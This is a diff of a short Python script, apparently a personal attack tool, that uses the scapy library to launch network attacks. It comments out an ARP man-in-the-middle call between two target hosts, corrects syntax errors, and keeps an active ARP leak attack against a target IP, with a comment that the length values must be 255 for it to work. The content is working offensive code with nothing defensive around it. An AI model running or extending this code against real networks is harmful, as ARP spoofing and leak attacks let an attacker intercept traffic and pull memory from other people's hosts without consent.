@@ -5,11 +5,11 @@ import scapy.all
 
 def attack(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface):
     # mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address- defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
-    scapy.layers.l2.arp_mitm(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface)
+    #scapy.layers.l2.arp_mitm(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface)
     # scapy.layers.l2.arp_mitm("0.0.0.0", "0.0.0.0", "ff-ff-ff-ff-ff-ff", "ff-ff-ff-ff-ff-ff", False, "ff-ff-ff-ff-ff-ff", "Ethernet2")
     # scapy.layers.l2.arp_mitm(ip1, ip2, mac1, mac2 ,Broadcast, target_mac, iface)
-    ARP_Leak_Attack(T1ip):
-    Ethernet_Leak_Attack(T1ip):
+    ARP_Leak_Attack(T1ip)
+    #Ethernet_Leak_Attack(T1ip)
     return "Attacks Sent"
 
 
@@ -20,7 +20,7 @@ def attack(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface):
 # >>> arp_mitm("192.168.122.156", "192.168.122.17")
 
 def ARP_Leak_Attack(VIP):
-    scapy.layers.l2.arpleak(VIP, 255, 255, ...)  # Values must be 255 for it to work
+    scapy.layers.l2.arpleak(VIP, 255, 255)  # Values must be 255 for it to work
     print("ARP_Leak_Attack sent to " + VIP)
 
 # scapy.layers.l2.arpleak(target: str, plen, hwlen, **kargs) Returns: Tuple[SndRcvList, PacketList]
